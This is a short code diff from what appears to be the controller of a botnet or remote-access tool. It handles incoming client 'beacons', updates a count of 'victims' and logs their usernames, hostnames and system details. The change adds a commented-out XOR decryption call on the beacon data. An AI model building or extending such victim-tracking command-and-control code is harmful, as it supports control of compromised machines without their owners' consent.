@@ -246,6 +246,7 @@ void *net_t_client(void *args){
       free(p_net_client_beacon);
       pthread_exit(NULL);
     }
+    //crypt_decrypt_xor((void *)p_net_client_beacon, sizeof(net_client_beacon_t), 10);
     net_update_victims(p_net_client_beacon, p_victims);
     /* printf("[+] victims: %d\n", NET_VICTIMS_TOTAL); */
     /* printf("[+] CONNECT user:%s@%s, hostname:%s, arch:%s, release:%s, load:%d\n", */
